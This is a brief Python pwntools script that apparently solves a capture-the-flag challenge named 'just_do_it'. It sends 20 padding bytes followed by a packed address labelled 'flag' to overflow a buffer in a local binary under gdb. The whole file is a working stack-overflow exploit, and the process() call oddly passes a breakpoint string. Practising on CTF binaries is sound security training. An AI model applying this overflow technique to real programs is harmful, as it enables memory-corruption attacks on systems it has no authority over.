from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

p = process('./just_do_it', 'break *0x80486f7')
gdb.attach(p)
#p = gdb.debug('./just_do_it', 'break *0x80486f7')

flag = 0x0804a080

buf = ""
buf += "A" * 20

buf += p32(flag)

print p.recv()
p.sendline(buf)
p.interactive()
